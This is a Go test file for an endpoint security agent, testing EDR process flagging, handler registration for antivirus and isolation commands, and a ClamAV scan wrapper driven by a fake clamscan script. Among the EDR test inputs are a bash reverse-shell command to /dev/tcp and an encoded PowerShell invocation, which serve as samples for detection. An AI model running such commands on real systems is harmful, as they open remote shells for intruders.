package agent

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestEDRFlags(t *testing.T) {
	cases := []struct {
		p    edrProc
		want bool
	}{
		{edrProc{Name: "chrome.exe", Path: `C:\Program Files\Google\Chrome\chrome.exe`}, false},
		{edrProc{Name: "a.exe", Path: `C:\Users\x\AppData\Local\Temp\a.exe`}, true},
		{edrProc{Name: "sh", Path: "/tmp/.x/sh"}, true},
		{edrProc{Name: "nginx", Path: "/usr/sbin/nginx"}, false},
		{edrProc{Name: "x", Path: "/usr/bin/x (deleted)"}, true},
		{edrProc{Name: "powershell.exe", Path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, Cmdline: "powershell -enc AAAA"}, true},
		{edrProc{Name: "bash", Path: "/bin/bash", Cmdline: "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"}, true},
	}
	for _, c := range cases {
		if got := len(edrFlags(c.p)) > 0; got != c.want {
			t.Errorf("%+v flagged=%v want %v", c.p, got, c.want)
		}
	}
}

func TestHexAddr(t *testing.T) {
	if got := hexAddr("0100007F:0050"); got != "127.0.0.1:80" {
		t.Fatalf("got %s", got)
	}
}

// Every command the server can send must exist on the agent, or the PC answers "unknown command".
func TestSecHandlersRegistered(t *testing.T) {
	a := &Agent{}
	for _, n := range []string{"av.status", "av.scan", "av.update", "av.threats", "edr.snapshot", "edr.isolate", "edr.release", "module.install", "wol.configure"} {
		if _, ok := a.handlers()[n]; !ok {
			t.Errorf("agent has no handler for %s", n)
		}
	}
}

// A stand-in clamscan that prints one line per file shows that progress, counting and findings work.
func TestClamScanProgress(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip()
	}
	dir := t.TempDir()
	data := filepath.Join(dir, "data")
	_ = os.MkdirAll(data, 0o755)
	for i := 0; i < 5; i++ {
		_ = os.WriteFile(filepath.Join(data, fmt.Sprintf("f%d", i)), []byte("x"), 0o644)
	}
	bin := filepath.Join(dir, "bin")
	_ = os.MkdirAll(bin, 0o755)
	script := "#!/bin/sh\nfor f in \"$@\"; do :; done\nfor i in 0 1 2 3 4; do echo \"$DATA/f$i: OK\"; done\necho \"$DATA/f4: Eicar-Test FOUND\"\nexit 1\n"
	_ = os.WriteFile(filepath.Join(bin, "clamscan"), []byte(script), 0o755)
	t.Setenv("PATH", bin+":"+os.Getenv("PATH"))
	t.Setenv("DATA", data)
	var last string
	c := &cmdCtx{progress: func(s string) { last = s }, pct: func(p int, s string) { last = s }}
	found, err := clamScan(context.Background(), c, []string{"-r"}, []string{data}, false)
	if err != nil || len(found) != 1 || !strings.Contains(found[0], "Eicar") {
		t.Fatalf("found=%v err=%v", found, err)
	}
	if last == "" {
		t.Error("no progress was reported")
	}
}
